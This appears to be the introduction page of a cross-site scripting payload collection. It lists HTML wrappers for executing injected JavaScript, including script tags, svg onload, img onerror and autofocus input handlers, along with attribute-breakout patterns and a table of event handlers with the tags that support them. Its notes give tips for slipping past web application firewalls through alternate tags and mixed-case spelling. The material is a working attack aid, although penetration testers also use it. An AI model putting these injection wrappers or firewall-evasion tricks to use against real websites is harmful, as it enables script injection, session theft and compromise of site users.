# Payloads to...

* [Fetch an external resource](fetch.md)

# Introduction

The payloads described in the various files may need wrapping to put them in a JavaSscript context (unless the injection ends up already inside a JS context, which is rare). Possible ways to execute a payload are:

* If injection ends up outside of an HTML tag:
  * `<script>`**_payload_**`</script>`
  * `<svg/onload="`**_payload_**`"/>`
  * `<img/onerror="`**_payload_**`"/src=x>`
  * `<style/onload="`**_payload_**`"></style>`
  * `<input/onfocus="`**_payload_**`"/autofocus>`
  * `<marquee/onstart="`**_payload_**`"></marquee>`
  * `<div/onwheel="`**_payload_**`"/style="height:200%;width:100%"></div>`
  * `<div/onmouseover="`**_payload_**`"/style="height:100%;width:100%"></div>`
  * ... many more, see below table for event attributes and supported tags
* If injection ends up inside an HTML tag's attribute:
  * `" `**_event_**`="`**_payload_**
  * `' `**_event_**`='`**_payload_** *(replace single quotes in payload with double quotes)*

##### Event handlers
Possible events and the supported HTML tags are:

| event         | supported HTML tags |
|---------------|---------------------|
| onload        | body, frame, frameset, iframe, img, input type="image", link, script, style |
| onchange      | input type="checkbox", input type="file", input type="password", input type="radio", input type="range", input type="search", input type="text", select, textarea |
| onkeyup       | **all except** base, bdo, br, head, html, iframe, meta, param, script, style, title |
| onmouseover   | &#x2014;"&#x2014; |
| onblur        | &#x2014;"&#x2014; |
| onfocus       | &#x2014;"&#x2014; |
| onclick       | &#x2014;"&#x2014; |
| onmouseover   | &#x2014;"&#x2014; |
| onmouseout    | &#x2014;"&#x2014; |
| oncontextmenu | **all, but it can only be triggered if the element takes space on the page** |
| onwheel       | &#x2014;"&#x2014; |
| ondrag        | &#x2014;"&#x2014; |
| ondrop        | &#x2014;"&#x2014; |
| oncopy        | &#x2014;"&#x2014; |
| oncut         | &#x2014;"&#x2014; |
| onpaste       | &#x2014;"&#x2014; |
| onscroll      | address, blockquote, body, caption, center, dd, dir, div, dl, dt, fieldset, form, h1&#x2014;h6, html, li, menu, object, ol, p, pre, select, tbody, textarea, tfoot, thead, ul |
| oninvalid     | input |
| oninput       | input type="password", input type="search", input type="text", textarea |
| onsearch      | input type="search" |
| onselect      | input type="file", input type="password", input type="text", textarea |
| onreset       | form |
| onsubmit      | form |

##### NOTES
* Some WAFs block only some html tags (e.g. `<script>`), but not other tags, so don't give up after trying a few that got rejected.
* Some WAFs do a poor job and fail to block HTML tags or attributes when they are capitalized (or mixed case). Give that a try.
* Many event handlers require user action. See more at `https://www.w3schools.com/TAGS/ev_`**_event_**`.asp`
